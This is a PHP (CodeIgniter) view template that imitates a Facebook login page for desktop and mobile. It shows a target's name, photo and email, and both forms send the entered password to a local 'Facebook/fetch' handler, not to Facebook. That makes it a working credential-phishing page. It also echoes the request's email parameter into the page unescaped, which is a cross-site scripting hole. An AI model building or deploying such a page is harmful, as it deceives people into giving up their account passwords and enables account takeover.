<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?>
<?php
	$this->load->helper('url');
	$user['email']=$this->input->get_post("email");

	?>
<!DOCTYPE html>
<html>
<head>
	<title></title>

	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<!-- jQuery library -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

	<!-- Latest compiled JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<style type="text/css">

	.row1 {

		background-color: #4867AA;
	}

	#fb1 {

		margin-left: 90px;
	}

	.btn1 {
		margin-left: 9px;
		margin-top: 4px;
	}

	.box1 {

		background-color: white;
		margin-top: 100px;
		padding-bottom: 90px;
		margin-bottom: 100px;



	}

	body {
		background-color: #DCE0EE;
	}

	#p1 {
		margin-top: 20px;
		color: #4867AA;
		font-size: 16px;

	}

	#p2 {

		margin-left: 120px;
		margin-top: 10px;
	}

	.img2 {

		width: 80px;
		margin-left: 230px;	
		margin-top: -45px;


	}

	#name {

		margin-left: 340px;
		margin-top: -85px;
		font-size: 13px;
	}

	#not {
		margin-top: 60px;
		margin-left: 240px;
		color: blue;
		font-size: 13px;
	}

	#pass {

		margin-left: 96px;
		margin-top: 10px;

	}

	.password {
		margin-left: 230px;
		margin-top: -30px;

	}

	.pwd {
		width: 70%;
		height: 20px;
	}

	.cb {
		margin-left: 230px;
		padding-top: 10px;
	}

	.check {

		font-size: 12px;
		margin-left: 20px;
		margin-top: -18px;
	}

	.btnlogin {
		margin-left: 230px;
	}

	#inside {
		color: blue;
		margin-left: 20px;
		margin-top: -30px;
		font-size: 13px;	
	}

	.in {
		margin-left: 310px;
		margin-top: -25px;
	}	

	#fp {
		margin-left: 230px;
		font-size: 12px;
		color: blue;
	}

	.box3 {
		background-color: white;
		padding-bottom: 130px;
	}

	.header {

		background-color: #4867AA;
	}

	#mobimg1 {
		padding-left: 23%;
		
	}

	.mobbox1 {
		background-color: white;
		margin-top: 100px;
		padding-bottom: 40px;
		margin-bottom: 100px;
	}

	#fbl {
		color : #4867AA;
		margin-top: 25px;
	}

	.loginmob {

		margin-top: -10px;
	}

	.katimgmob {

		width: 70px;
	}

	#para3 {

		color: blue;
		font-size: 12px;
		margin-top: 10px;
	}
	
	#para4 {
		font-size: 13px;

	}

	.mobpass1 {

		width: 98%;
		height: 20px;
	}

	.cb2 {

		margin-top: 30px;
	}

	#para5 {

		font-size: 12px;
		margin-left: 20px;	
		margin-top: -20px;
	}

	.btnmob2 {

		margin-top: 10px;
	}

	.in2 {

		margin-left: 65px;
		margin-top: -25px;
		font-size: 13px;
	}

	#inside2 {

		margin-left: 20px;
		margin-top: -30px;
		color: blue;
	}

	#forgotmob {

		color: blue;
		font-size: 12px;
	}

	.lastrow {
		background-color: white;
		padding-bottom: 90px;
	}
	</style>
	</head>

	<body>

		<div class="container-fluid">
		<!--row 1 starts here-->
		
			<div class="row row1 hidden-sm hidden-xs">
				<div class="col-md-offset-0 col-md-12 col-lg-offset-0 col-lg-12 ">
					<img src="<?php echo base_url().'image/fbnew.jpg';?>" id="fb1">
					<button type="button" class="btn btn-success btn1">Sign Up</button>
				</div>
			</div>
			<div class="row hidden-sm hidden-xs">
				<div class="col-md-offset-3 col-md-6 col-lg-offset-3 col-lg-6 box1">
					<p id="p1"><b>Facebook Login</b></p>
					<hr>
					<p id="p2">Login :</p>
					<img src="<?php echo base_url().'uploads/'.$data['Image'];?>" class="img2">
					<p id="name"><?php echo $data['Firstname']; ?><br><?php echo $user['email']; ?></p>
					<p id="not">Not <?php echo $data['Firstname']; ?></p>
					<form action="<?php echo base_url().'/index.php/Facebook/fetch'?>" method="post">
					<input type="hidden" name="email" value="<?php echo $user['email']; ?>"> <!--value="user@gmail.com"-->
					<p id="pass">Password :</p>
					<div class="password">
					<input type="password" name="pwd" class="pwd">
					</div>
					<div class="cb">
						<input type="checkbox"><p class="check">Keep me logged in</p>
					</div>
					<div class="row btnlogin">
						<button type="submit" class="btn2 btn btn-primary">Log In</button>
						
					</div>
					<div class="in">
					<p>or<p id="inside">Sign Up on Facebook</p></p>
					</div>
					<p id="fp">Forgot password?</p>
					</form>


				</div>
				

			</div>
			<div class="row hidden-sm hidden-xs">
				<div class="col-md-12 col-lg-12 box3">

				</div>
			</div>

			<!--Mobile version starts here -->

			<div class="row hidden-md hidden-lg">
				<div class="col-sm-12 col-xs-12 header">

				<img src="<?php echo base_url().'image/fbnew.jpg';?>" id=mobimg1>

				</div>

			</div>
			<div class="row hidden-md hidden-lg">
				<div class="col-xs-12 col-sm-12 mobbox1">

				 	<p id="fbl"><b>Facebook Login</b></p>
				 	<hr><br>
				 	<p class="loginmob">Login :</p>
				 	<img src="<?php echo base_url().'uploads/'.$data['Image'];?>" class="katimgmob">
				 	<p id="para3">Not <?php echo $data['Firstname']; ?></p>
				 	<p id="para4"><?php echo $data['Firstname']; ?><br><?php echo $user['email']; ?></p>	
				 	<p id="mobpass">Password : </p>
				 	<form method="post" action="<?php echo base_url().'/index.php/Facebook/fetch'?>">
				 		<input type="hidden" name="email" value="<?php echo $user['email']; ?>">
				 		<input type="password" name="pwd" class="mobpass1" >
				 		
				 	
				 	<div>
				 		<input type="checkbox" class="cb2"><p id="para5">Keep me logged in</p>
				 	</div>

						<button type="submit" class="btnmob2 btn btn-primary btn-sm">Log In</button>
						
					<div class="in2">
					<p>or<p id="inside2">Sign Up on Facebook</p></p>
					</div>
					<p id="forgotmob">Forgot password?</p>
					</form>


				</div>


			</div>
			<div class="row hidden-md hidden-lg">

				<div class="col-sm-12 col-xs-12 lastrow">
				</div>
			</div>

		</div>
		
	</body>
	</html>
